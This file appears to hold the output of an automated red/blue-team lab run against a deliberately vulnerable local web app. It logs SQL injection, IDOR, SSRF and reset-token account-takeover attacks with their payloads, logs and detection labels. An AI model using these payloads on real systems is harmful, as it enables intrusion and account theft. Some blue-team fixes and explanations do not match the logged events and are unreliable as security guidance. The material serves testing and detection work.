@@ -1,0 +1,221 @@
+{
+  "portal": "http://127.0.0.1:5500",
+  "engagements": [
+    {
+      "id": "sql_injection",
+      "label": "SQL Injection",
+      "recon_tell": "login form (username/password) builds a SQL query from raw input",
+      "recon_lines": [
+        "GET /                      status=200  (tech tells: Werkzeug/3.1.8 Python/3.11.9; cookies: none)",
+        "form http://127.0.0.1:5500    fields: username, password",
+        "GET /login                   status=405 content-type=application/json  (accepts POST; response: POST message='Invalid credentials')"
+      ],
+      "selected": "sql_injection",
+      "red_actions": [
+        "try login username=\"' OR '1'='1'\"",
+        "try login username=\"' OR '1'='1' -- \"  \u2713"
+      ],
+      "payload": {
+        "username": "' OR '1'='1' -- ",
+        "password": "admin"
+      },
+      "success": true,
+      "window": "2026-10-30 09:14:19,886 LOGIN_ATTEMPT username=\"' OR '1'='1'\" password='admin' query=\"SELECT username FROM users WHERE username = '' OR '1'='1'' AND password = 'admin'\" error='near \"admin\": syntax error' result=NO_MATCH\n2026-10-30 09:14:19,886 LOGIN_FAIL username=\"' OR '1'='1'\"\n2026-10-30 09:14:30,101 LOGIN_ATTEMPT username=\"' OR '1'='1' -- \" password='admin' query=\"SELECT username FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'admin'\" error=None result=MATCH\n2026-10-30 09:14:30,101 LOGIN_SUCCESS username=\"' OR '1'='1' -- \" matched_user='admin'\n",
+      "blue": {
+        "threat_detected": true,
+        "threat_category": "SQL Injection",
+        "recommended_fix": "Replace the string concatenation strategy with a prepared statement that binds each identifier (username, password, etc.) using a library-specific API; don't rely on a regex to filter out keyword-like substrings.",
+        "explanation": "The same pattern - a literal string followed by a comment sequence indicating SQL escape - was used to pivot into the database's authentication system.",
+        "chained": false
+      }
+    },
+    {
+      "id": "idor",
+      "label": "Insecure Direct Object Reference",
+      "recon_tell": "/api/tickets/<id> \u2014 sequential numbered sub-resource, no ownership gate",
+      "recon_lines": [
+        "GET /                      status=200  (tech tells: Werkzeug/3.1.8 Python/3.11.9; cookies: none)",
+        "form http://127.0.0.1:5500    fields: username, password",
+        "GET /api/tickets             status=401 content-type=application/json  (id_shape=sequential; response: sub-resource /1 -> message='invalid or missing session token')"
+      ],
+      "selected": "idor",
+      "red_actions": [
+        "GET /api/tickets/1",
+        "GET /api/tickets/4",
+        "GET /api/tickets/2  \u2713"
+      ],
+      "payload": {
+        "ticket_id": 2
+      },
+      "success": true,
+      "window": "2026-10-30 09:14:39,373 LOGIN_ATTEMPT username='' password='' query=\"SELECT username FROM users WHERE username = '' AND password = ''\" error=None result=NO_MATCH\n2026-10-30 09:14:39,373 LOGIN_FAIL username=''\n2026-10-30 09:14:39,389 TICKET_ACCESS ticket_id=1 requester_id=1 owner_id=1 cross_owner=False result=SUCCESS\n2026-10-30 09:14:47,848 LOGIN_ATTEMPT username='' password='' query=\"SELECT username FROM users WHERE username = '' AND password = ''\" error=None result=NO_MATCH\n2026-10-30 09:14:47,848 LOGIN_FAIL username=''\n2026-10-30 09:14:47,865 TICKET_ACCESS ticket_id=4 requester_id=1 result=NOT_FOUND\n2026-10-30 09:14:56,840 LOGIN_ATTEMPT username='' password='' query=\"SELECT username FROM users WHERE username = '' AND password = ''\" error=None result=NO_MATCH\n2026-10-30 09:14:56,840 LOGIN_FAIL username=''\n2026-10-30 09:14:56,856 TICKET_ACCESS ticket_id=2 requester_id=1 owner_id=2 cross_owner=True result=SUCCESS\n",
+      "blue": {
+        "threat_detected": true,
+        "threat_category": "Insecure Direct Object Reference (IDOR)",
+        "recommended_fix": "Compare the session owner_id against the ticket owner_id on each access attempt, and return an authorization error when they don't match (logout the user if necessary).",
+        "explanation": "The session for requester_id=1 was issued a token for owner_id=2 and was used to read ticket_id=2.",
+        "chained": null
+      }
+    },
+    {
+      "id": "ssrf",
+      "label": "Server-Side Request Forgery",
+      "recon_tell": "/preview fetches a client-supplied URL server-side (no host allowlist)",
+      "recon_lines": [
+        "GET /                      status=200  (tech tells: Werkzeug/3.1.8 Python/3.11.9; cookies: none)",
+        "form http://127.0.0.1:5500    fields: username, password",
+        "GET /preview                 status=405 content-type=application/json  (accepts POST; response: POST error=\"Invalid URL '': No scheme supplied. Perhaps you meant https://?\")"
+      ],
+      "selected": "ssrf",
+      "red_actions": [
+        "POST /preview url='http://127.0.0.1:5500/preview'",
+        "POST /preview url='http://127.0.0.1:6000/admin-metadata'  \u2713"
+      ],
+      "payload": {
+        "url": "http://127.0.0.1:6000/admin-metadata"
+      },
+      "success": true,
+      "window": "2026-10-30 09:15:05,665 PREVIEW_REQUEST url='http://127.0.0.1:5500/preview' status=405 error=None canary_leaked=False\n2026-10-30 09:15:19,118 PREVIEW_REQUEST url='http://127.0.0.1:6000/admin-metadata' status=200 error=None canary_leaked=True\n",
+      "blue": {
+        "threat_detected": true,
+        "threat_category": "Server-Side Request Forgery (SSRF) - internal metadata service accessed",
+        "recommended_fix": "Block requests to localhost:6000 by IP range and file extension, then return a friendly web page when configured hosts allow it, proving external parties cannot reach this code path.",
+        "explanation": "The same endpoint ('admin-metadata') available at a different, internal port number revealed the file system contents of the server process (./secret/canary.txt). The difference between a test and a link is the latter can fetch files without user intervention.",
+        "chained": false
+      }
+    },
+    {
+      "id": "chain",
+      "label": "Token Leak \u2192 Account Takeover (chain)",
+      "recon_tell": "/api/reset-requests/<id> \u2014 sequential, leaks a reusable reset_token",
+      "recon_lines": [
+        "GET /                      status=200  (tech tells: Werkzeug/3.1.8 Python/3.11.9; cookies: none)",
+        "form http://127.0.0.1:5500    fields: username, password",
+        "GET /api/reset-requests      status=200 content-type=application/json  (id_shape=sequential; response: sub-resource /1 -> issued a session token to a request with no credentials (keys: email, request_id, reset_token, status, user))"
+      ],
+      "selected": "chain",
+      "red_actions": [
+        "read_reset_request id=1  \u2192 leaked RST-a7c3e9f1b2d64856",
+        "read_reset_request id=2",
+        "read_reset_request id=3",
+        "read_reset_request id=4",
+        "read_reset_request id=5",
+        "read_reset_request id=6",
+        "complete_reset reset_token='RST-a7c3e9f1b2d64856'  \u2192 ADMIN TAKEOVER"
+      ],
+      "payload": {
+        "request_id": 1,
+        "reset_token": "RST-a7c3e9f1b2d64856"
+      },
+      "success": true,
+      "window": "2026-10-30 09:15:24,913 RESET_REQUEST_READ id=1 user=admin leaked_token=True result=SUCCESS\n2026-10-30 09:15:27,899 RESET_REQUEST_READ id=2 user=jdoe leaked_token=False result=SUCCESS\n2026-10-30 09:15:30,434 RESET_REQUEST_READ id=3 user=guest leaked_token=False result=SUCCESS\n2026-10-30 09:15:33,131 RESET_REQUEST_READ id=4 result=NOT_FOUND\n2026-10-30 09:15:37,258 RESET_REQUEST_READ id=5 result=NOT_FOUND\n2026-10-30 09:15:40,556 RESET_REQUEST_READ id=6 result=NOT_FOUND\n2026-10-30 09:15:42,908 RESET_COMPLETE token='RST-a7c3e9f1b2d64856' result=ADMIN_TAKEOVER\n",
+      "blue": {
+        "threat_detected": true,
+        "threat_category": "Broken Authentication",
+        "recommended_fix": "Generate session identifiers with sufficient entropy (a cryptographically secure random generator) rather than incrementing a counter, and bind each token to the account it was issued to.",
+        "explanation": "The same session-prediction pattern succeeded again with different cookie syntax, confirming the vulnerability is structural (the token scheme itself) rather than one unlucky guess.",
+        "chained": true
+      }
+    }
+  ],
+  "benign_events_raw": [
+    [
+      "2026-10-30 09:14:02,099 LOGIN_ATTEMPT username='a.turing' password='enigma-1936' query=\"SELECT username FROM users WHERE username = 'a.turing' AND password = 'enigma-1936'\" error=None result=MATCH",
+      "2026-10-30 09:14:02,099 LOGIN_SUCCESS username='a.turing' matched_user='a.turing'"
+    ],
+    [
+      "2026-10-30 09:14:02,099 LOGIN_ATTEMPT username='a.turing' password='enigma-1936' query=\"SELECT username FROM users WHERE username = 'a.turing' AND password = 'enigma-1936'\" error=None result=MATCH",
+      "2026-10-30 09:14:02,099 LOGIN_SUCCESS username='a.turing' matched_user='a.turing'",
+      "2026-10-30 09:14:02,130 TICKET_ACCESS ticket_id=1 requester_id=1 owner_id=1 cross_owner=False result=SUCCESS"
+    ],
+    [
+      "2026-10-30 09:14:02,130 PREVIEW_REQUEST url='http://127.0.0.1:5500/welcome' status=200 error=None canary_leaked=False"
+    ],
+    [
+      "2026-10-30 09:14:02,141 RESET_REQUEST_READ id=3 user=guest leaked_token=False result=SUCCESS"
+    ],
+    [
+      "2026-10-30 09:14:02,162 LOGIN_ATTEMPT username='m.okafor' password='nimm44ppi1' query=\"SELECT username FROM users WHERE username = 'm.okafor' AND password = 'nimm44ppi1'\" error=None result=NO_MATCH",
+      "2026-10-30 09:14:02,162 LOGIN_FAIL username='m.okafor'"
+    ]
+  ],
+  "log_events": [
+    {
+      "raw_lines": [
+        "2026-10-30 09:14:02,099 LOGIN_ATTEMPT username='a.turing' password='enigma-1936' query=\"SELECT username FROM users WHERE username = 'a.turing' AND password = 'enigma-1936'\" error=None result=MATCH",
+        "2026-10-30 09:14:02,099 LOGIN_SUCCESS username='a.turing' matched_user='a.turing'"
+      ],
+      "source": "benign",
+      "flagged": false,
+      "category": ""
+    },
+    {
+      "raw_lines": [
+        "2026-10-30 09:14:02,099 LOGIN_ATTEMPT username='a.turing' password='enigma-1936' query=\"SELECT username FROM users WHERE username = 'a.turing' AND password = 'enigma-1936'\" error=None result=MATCH",
+        "2026-10-30 09:14:02,099 LOGIN_SUCCESS username='a.turing' matched_user='a.turing'"
+      ],
+      "source": "benign",
+      "flagged": false,
+      "category": ""
+    },
+    {
+      "raw_lines": [
+        "2026-10-30 09:14:02,130 PREVIEW_REQUEST url='http://127.0.0.1:5500/welcome' status=200 error=None canary_leaked=False"
+      ],
+      "source": "benign",
+      "flagged": false,
+      "category": ""
+    },
+    {
+      "raw_lines": [
+        "2026-10-30 09:14:02,141 RESET_REQUEST_READ id=3 user=guest leaked_token=False result=SUCCESS"
+      ],
+      "source": "benign",
+      "flagged": false,
+      "category": ""
+    },
+    {
+      "raw_lines": [
+        "2026-10-30 09:14:02,162 LOGIN_ATTEMPT username='m.okafor' password='nimm44ppi1' query=\"SELECT username FROM users WHERE username = 'm.okafor' AND password = 'nimm44ppi1'\" error=None result=NO_MATCH",
+        "2026-10-30 09:14:02,162 LOGIN_FAIL username='m.okafor'"
+      ],
+      "source": "benign",
+      "flagged": false,
+      "category": ""
+    },
+    {
+      "raw_lines": [
+        "2026-10-30 09:14:19,886 LOGIN_ATTEMPT username=\"' OR '1'='1'\" password='admin' query=\"SELECT username FROM users WHERE username = '' OR '1'='1'' AND password = 'admin'\" error='near \"admin\": syntax error' result=NO_MATCH",
+        "2026-10-30 09:14:19,886 LOGIN_FAIL username=\"' OR '1'='1'\""
+      ],
+      "source": "attack",
+      "flagged": true,
+      "category": "SQL Injection"
+    },
+    {
+      "raw_lines": [
+        "2026-10-30 09:14:56,856 TICKET_ACCESS ticket_id=2 requester_id=1 owner_id=2 cross_owner=True result=SUCCESS"
+      ],
+      "source": "attack",
+      "flagged": true,
+      "category": "Insecure Direct Object Reference (IDOR)"
+    },
+    {
+      "raw_lines": [
+        "2026-10-30 09:15:19,118 PREVIEW_REQUEST url='http://127.0.0.1:6000/admin-metadata' status=200 error=None canary_leaked=True"
+      ],
+      "source": "attack",
+      "flagged": true,
+      "category": "Server-Side Request Forgery (SSRF) - internal metadata service accessed"
+    },
+    {
+      "raw_lines": [
+        "2026-10-30 09:15:24,913 RESET_REQUEST_READ id=1 user=admin leaked_token=True result=SUCCESS",
+        "2026-10-30 09:15:42,908 RESET_COMPLETE token='RST-a7c3e9f1b2d64856' result=ADMIN_TAKEOVER"
+      ],
+      "source": "attack",
+      "flagged": true,
+      "category": "Broken Authentication"
+    }
+  ]
+}
